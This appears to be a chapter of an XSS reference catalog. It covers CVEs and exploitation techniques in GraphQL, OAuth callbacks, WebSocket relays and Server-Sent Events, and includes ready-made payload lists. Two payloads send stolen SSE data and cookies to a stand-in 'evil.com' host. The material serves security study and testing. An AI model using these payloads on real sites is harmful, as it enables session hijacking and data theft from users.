# 56 - GraphQL, OAuth, WebSocket & SSE XSS

## Overview

Modern web architectures use GraphQL APIs, OAuth/OIDC authentication flows, WebSocket connections, and Server-Sent Events (SSE) as core communication channels. Each introduces unique XSS vectors: GraphQL responses rendered unsafely, OAuth callback parameters reflected without escaping, WebSocket messages relayed without sanitization, and SSE streams vulnerable to CRLF injection. This document catalogs specific CVEs, exploitation techniques, and payloads for each vector.

---

## 1. GraphQL XSS

### 1.1 @urql/next CVE-2024-24556: Streamed Response XSS

**Affected versions**: @urql/next < 1.1.1
**CVSS**: 6.1 (Medium)

**Vulnerability**: The `@urql/next` package is XSS-vulnerable when a GraphQL response contains HTML tags and the web application uses streamed responses (non-RSC). Improper escaping of HTML-like characters in the response stream allows injected HTML to execute.

**Root cause**: When streaming GraphQL responses, the package serializes response data directly into the HTML document without escaping HTML special characters. A GraphQL String field containing `<script>alert(1)</script>` is written into the page source verbatim.

**Exploitation**:
1. Attacker stores a GraphQL mutation with HTML payload in a String field
2. Application renders the field via `@urql/next` streaming
3. HTML is injected into the SSR/streaming HTML output
4. JavaScript executes in the victim's browser

```graphql
mutation {
  createPost(input: {
    title: "<img src=x onerror=alert(document.cookie)>"
    body: "Normal content"
  }) {
    id
  }
}
```

**Fix**: Update to @urql/next >= 1.1.1

**Source**: [Tenable CVE-2024-24556](https://tenable.com/cve/CVE-2024-24556)

### 1.2 GraphiQL CVE-2026-42794: Reflected XSS via Backslash Bypass

**CVSS**: 2.3 (Low)

**Vulnerability**: Reflected XSS via backslash bypass in the escaping of the query GET parameter. GraphiQL's URL parameter handling for the `query` parameter had an escaping flaw where backslashes could be used to bypass the escaping of HTML-significant characters.

**Exploitation**:
```
https://target.com/graphiql?query=\"><script>alert(1)</script>
```

**Impact**: Low severity because GraphiQL is typically a development tool, but it may be exposed on production deployments (common misconfiguration).

**Source**: [Intruder CVEmon](https://cvemon.intruder.io/cves/technologies/graphql-vulnerabilities)

### 1.3 GraphQL Response Rendering XSS Patterns

GraphQL's typed schema gives a false sense of security. Developers assume that typed fields (String, Int, etc.) are safe to render, but:

- A `String` field can contain `<script>` tags
- The type system does not perform output encoding
- Both reflected and stored variants are possible depending on query vs. mutation

**Dangerous rendering patterns**:
```javascript
// DANGEROUS: React dangerouslySetInnerHTML with GraphQL data
<div dangerouslySetInnerHTML={{ __html: data.post.body }} />

// DANGEROUS: Vue v-html with GraphQL data
<div v-html="post.body"></div>

// DANGEROUS: innerHTML assignment with GraphQL response
document.getElementById('content').innerHTML = data.post.content;
```

---

## 2. NestJS SSE CVE-2026-35515: CRLF Injection

**Affected component**: NestJS Server-Sent Events
**CVSS**: Medium

**Vulnerability**: CRLF injection in SSE event streams. SSE fields are delimited by CRLF (`\r\n`), so unescaped carriage return and newline characters in data values can inject additional SSE fields (e.g., `event:`, `data:`, `id:` lines).

**Technical details**: When a NestJS SSE endpoint includes user-controlled data in the event stream without stripping CRLF characters, an attacker can inject arbitrary SSE events:

```
// Normal SSE response
data: {"message": "Hello"}

// With CRLF injection in the message field
data: {"message": "Hello\r\n\r\ndata: <script>alert(1)</script>"}

// Browser sees two separate events:
// Event 1: data: {"message": "Hello
// Event 2: data: <script>alert(1)</script>"}
```

**Impact**: If the client-side EventSource handler renders event data without sanitization (e.g., via innerHTML), the injected HTML executes as XSS.

**Exploitation**:
```javascript
// Client-side vulnerable EventSource handler
const evtSource = new EventSource('/api/events');
evtSource.onmessage = (event) => {
  // DANGEROUS: Renders SSE data directly to DOM
  document.getElementById('feed').innerHTML += event.data;
};

// Attacker injects via CRLF in a parameter that ends up in SSE data:
// GET /api/events?user=test%0d%0a%0d%0adata:%20<img%20src=x%20onerror=alert(1)>
```

---

## 3. OAuth/OIDC Flow XSS

### 3.1 Callback Parameter Rendering XSS

OAuth XSS vectors center on unsanitized rendering of callback parameters:

| Parameter | XSS Vector | Risk |
|-----------|-----------|------|
| `redirect_uri` | Attacker-controlled URL rendered in error page | Reflected XSS |
| `state` | Random value rendered in debug/logging UI | Reflected XSS |
| `error` | Error message rendered without escaping | Reflected XSS |
| `error_description` | Detailed error with user data rendered | Reflected XSS |
| `code` | Authorization code rendered in confirmation page | Low (opaque value) |

**Exploitation**:
```
// XSS via error_description parameter
https://target.com/oauth/callback?error=access_denied&error_description=<img/src=x onerror=alert(document.domain)>

// XSS via state parameter rendered in debug page
https://target.com/oauth/callback?state=<script>alert(1)</script>&code=valid_code

// XSS via redirect_uri rendered in error page
https://target.com/oauth/authorize?redirect_uri=javascript:alert(1)&client_id=valid
```

### 3.2 SPA OAuth Fragment Parsing XSS

Single-page applications that parse OAuth tokens from URL fragments are especially vulnerable:

```javascript
// DANGEROUS: SPA parsing OAuth response from fragment
const hash = window.location.hash.substring(1);
const params = new URLSearchParams(hash);
const accessToken = params.get('access_token');
const error = params.get('error_description');

// Rendering error without sanitization
if (error) {
  document.getElementById('error').innerHTML = error;
  // XSS via: #error_description=<img src=x onerror=alert(1)>
}
```

**Key insight**: Fragment-based OAuth responses are never sent to the server, bypassing server-side WAF rules entirely.

### 3.3 ACSAC 2023 Research Findings

A study of OAuth 2.0 redirect URI validation across identity providers found:
- Path confusion enabling XSS in 10 of 16 identity providers tested
- OAuth parameter pollution leading to HTML injection
- Redirect URI validation weaknesses allowing attacker-controlled domains

**Source**: [ACSAC 2023 Slides](https://acsac.org/2023/files/web/slides/innocenti-97-oauthvalidation.pdf)

---

## 4. WebSocket Relay XSS

### 4.1 Attack Pattern

WebSocket XSS occurs when servers relay unsanitized user input from one client to others. This is analogous to stored XSS:

1. Attacker sends XSS payload via WebSocket message
2. Server stores or relays the message to other connected clients
3. Victim's client renders the message without sanitization
4. JavaScript executes in victim's browser

**Most dangerous contexts**: Chat applications, collaborative editors, real-time dashboards, gaming platforms.

### 4.2 WebSocket Message Injection

```javascript
// Attacker sends XSS payload through WebSocket
const ws = new WebSocket('wss://target.com/chat');
ws.onopen = () => {
  ws.send(JSON.stringify({
    type: 'message',
    content: '<img src=x onerror=alert(document.cookie)>',
    username: '<svg onload=alert(1)>'
  }));
};
```

### 4.3 CSP Gap for WebSockets

CSP's `connect-src` directive covers WebSocket connections, but:
- WebSocket connections established during XSS persist beyond the triggering page context
- A WebSocket C2 channel maintains bidirectional real-time communication
- CSP cannot restrict what data flows through an established WebSocket

---

## 5. SSE CRLF Injection

### 5.1 Technical Background

Server-Sent Events use a text-based protocol where fields are delimited by newlines:

```
event: message
data: {"user": "alice", "text": "hello"}
id: 123

event: notification
data: New message received
```

### 5.2 Injection Vector

When user-controlled data is included in SSE fields without CRLF stripping:

```
// Legitimate SSE data
data: User alice says hello

// Injected via CRLF in user input
data: User alice%0d%0a%0d%0adata: <script>alert(1)</script>%0d%0asays hello

// Browser receives:
data: User alice

data: <script>alert(1)</script>
data: says hello
```

### 5.3 SSE CORS Exploitation

SSE GET requests skip CORS preflight (simple requests). Combined with misconfigured CORS headers (e.g., `Access-Control-Allow-Origin: *`), any third-party page can read a live SSE stream:

```javascript
// Cross-origin SSE data theft
const evtSource = new EventSource('https://target.com/api/events', {
  withCredentials: true
});
evtSource.onmessage = (event) => {
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: event.data
  });
};
```

**CVE-2026-46431 (Algernon)**: Hardcoded `Access-Control-Allow-Origin: *` allowed any page to read SSE streams.

---

## 6. Payloads

```
# GQL-01: GraphQL mutation with stored XSS
mutation { updateProfile(bio: "<img src=x onerror=alert(document.cookie)>") { id } }

# GQL-02: GraphiQL reflected XSS
https://target.com/graphiql?query=\"><img src=x onerror=alert(1)>

# OAUTH-01: OAuth error_description XSS
/oauth/callback?error=invalid_request&error_description=<svg/onload=alert(1)>

# OAUTH-02: OAuth state parameter XSS
/oauth/callback?state="><img src=x onerror=alert(1)>&code=AUTH_CODE

# WS-01: WebSocket chat message XSS
{"type":"msg","content":"<img src=x onerror=alert(document.cookie)>"}

# SSE-01: CRLF injection in SSE parameter
/api/events?user=test%0d%0a%0d%0adata:%20<img%20src=x%20onerror=alert(1)>

# SSE-02: Cross-origin SSE read (requires CORS misconfiguration)
new EventSource('https://target.com/api/stream',{withCredentials:true})
```

---

## [2026 API XSS Research Update]

### New GraphQL XSS CVEs (2026)

**CVE-2026-42794 (GraphiQL Reflected XSS):**
A reflected XSS caused by a backslash bypass in the query parameter escaping routine. The escaping function handles single quotes and newlines but fails to escape backslashes, allowing a crafted `query` GET parameter to break out of the string context. Affects version 1.2.0+. CVSS scores conflict between sources (2.3 to 6.1). Exploitable in any deployment that accepts GET-parameterized queries, a common configuration for shareable GraphiQL links.

**CVE-2026-59286 (Spring for GraphQL -- Missing SRI):**
Missing Subresource Integrity (SRI) on CDN-loaded scripts in the GraphiQL integration creates XSS risk through CDN compromise or MITM. Affects Spring for GraphQL versions 1.0.0 through 2.0.4. This is a supply-chain XSS risk that was only addressed in 2026.

**CVE-2026-59288 (Spring for GraphQL -- Information Leak):**
Information leak via malicious URL in GraphiQL. Affects versions 1.0.0 through 2.0.4. Chainable with XSS for expanded impact.

**CVE-2024-24556 (@urql/next):**
All versions before 1.1.1 failed to escape HTML-like characters in the response stream. @urql/next failed to escape HTML characters in JSON payloads injected into React Server Component (RSC) hydration bodies. CVSS 6.1-7.2 (score conflicts between sources).

**Persistent legacy risk:** CVE-2021-41248 (GraphiQL introspection schema injection, versions before 1.4.7) continues to affect enterprise deployments -- IBM's April 2026 bulletin confirms it affects watsonx.data 2.3.

**Source:** [Stack.watch CVE-2026-42794](https://stack.watch/vuln/CVE-2026-42794/); [Stack.watch CVE-2026-59286](https://stack.watch/vuln/CVE-2026-59286/); [IBM Support](https://www.ibm.com/support/pages/node/7268847)

### Updated OAuth XSS Vectors

**CVE-2026-32235 (Backstage auth backend):** Crafted URI passes allowlist verification while resolving to attacker's host. Affects `@backstage/plugin-auth-backend` before 0.27.1. CVSS 5.9.

**better-auth stored XSS (pre-1.6.13):** OIDC-provider and MCP plugins failed to validate `redirect_uri` scheme. `javascript:` URIs accepted at client registration and returned unchanged, executing in the authorization server's origin when assigned to `window.location.href`.

**CVE-2025-66040 (Spotipy):** Unsanitized error parameter in the local OAuth callback server allowed XSS during OAuth authentication.

**OAuth + XSS chaining (Salt Security, November 2025):** DOM-based XSS chained with OAuth login flows can bypass HTTP-only cookies and extract tokens. HTTP-only cookies block direct JavaScript access but do not prevent script execution or malicious redirects.

**Source:** [Praetorian](https://www.praetorian.com/blog/attacking-and-defending-oauth-2/); [NHI Management Group](https://nhimg.org/articles/xss-and-oauth-combine-into-a-modern-account-takeover-path/)

### Updated WebSocket and SSE XSS Vectors

**WebSocket (CVE-2024-48059, ChuanhuChatGPT):** Stored XSS via WebSocket message in AI chat application. Payload persists and executes in other users' browsers. AI chat applications are an expanding attack surface for WebSocket XSS.

**SSE Injection (3 CVEs in 2026):**
- **CVE-2026-35515 (@nestjs/core):** CRLF injection in SSE `type` and `id` fields. All versions through 11.1.17. Fixed 11.1.18
- **CVE-2026-43968 (cowlib, Erlang):** Filters `\n` but not bare `\r` in SSE fields. Affects 2.6.0-2.16.1. Enables event forgery
- **JLSEC-2026-619 (HTTP.jl, Julia):** SSE serializer wrote control fields verbatim. Fixed in v2.4.0

SSE `event.type` spoofing is particularly dangerous because it controls which event handler is dispatched -- redirecting data to a handler that does not sanitize untrusted input.

### New SSE/WebSocket Payloads

```
# SSE-03: NestJS SSE type field injection (CVE-2026-35515)
/api/events?type=test%0d%0adata:%20<img%20src=x%20onerror=alert(1)>%0d%0a%0d%0aevent:%20message

# SSE-04: cowlib bare \r event forgery (CVE-2026-43968)
/api/stream?id=test%0ddata:%20<script>alert(document.cookie)</script>%0d%0devent:%20inject

# WS-02: AI chat WebSocket stored XSS (CVE-2024-48059 pattern)
{"role":"user","content":"<img src=x onerror=fetch('https://evil.com/?c='+document.cookie)>"}

# GRAPHQL-XSS-01: GraphiQL backslash bypass (CVE-2026-42794)
/graphiql?query=\';alert(1)//

# GRAPHQL-XSS-02: Introspection schema type name injection (CVE-2021-41248 pattern)
# Requires control of schema response -- type name: <img src=x onerror=alert(1)>
```

**Source:** [OSV GHSA-36xv-jgw5-4q75](https://osv.dev/vulnerability/GHSA-36xv-jgw5-4q75); [Erlang Ecosystem Foundation CNA](https://cna.erlef.org/cves/CVE-2026-43968.html); [Tenable CVE-2024-48059](https://tenable.com/cve/CVE-2024-48059)
